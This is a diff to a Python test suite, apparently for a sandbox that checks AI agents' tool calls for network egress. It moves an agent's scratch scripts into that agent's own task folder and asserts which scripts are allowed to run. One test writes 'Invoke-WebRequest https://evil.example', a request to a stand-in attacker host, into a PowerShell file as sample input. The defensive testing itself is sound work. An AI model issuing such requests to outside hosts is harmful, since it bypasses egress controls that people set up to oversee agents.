@@ -501,17 +501,19 @@ class TestEgress(Base):
         self.passed("Bash", {"command": "dir"}, agent="agentA")  # git is code, not text
 
     def test_a_script_written_with_network_code_never_runs(self):
-        s = self.work / "get.py"
+        own = self.paths.task_work(50)  # agentZ's task: new files go in its own folder
+        own.mkdir(parents=True, exist_ok=True)
+        s = own / "get.py"
         self.passed("Write", {"file_path": str(s), "content": "import requests\nrequests.get(URL)\n"},
                     agent="agentZ")
         self.denied("Bash", {"command": f"python {s.as_posix()}"}, "NETWORK", agent="agentZ")
-        self.denied("Bash", {"command": "python get.py"}, "NETWORK", agent="agentZ")
-        ok = self.work / "gh.py"
+        self.denied("Bash", {"command": "python get.py"}, "NETWORK", agent="agentZ", cwd=own)
+        ok = own / "gh.py"
         self.passed("Write", {"file_path": str(ok), "content":
                               "import urllib.request\nurllib.request.urlopen("
                               "'https://api.github.com/repos/o/r')\n"}, agent="agentZ")
         self.passed("Bash", {"command": f"python {ok.as_posix()}"}, agent="agentZ")
-        e = self.work / "e.ps1"
+        e = own / "e.ps1"
         self.passed("Write", {"file_path": str(e), "content": "x"}, agent="agentZ")
         self.passed("Edit", {"file_path": str(e), "old_string": "x",
                              "new_string": "Invoke-WebRequest https://evil.example"}, agent="agentZ")
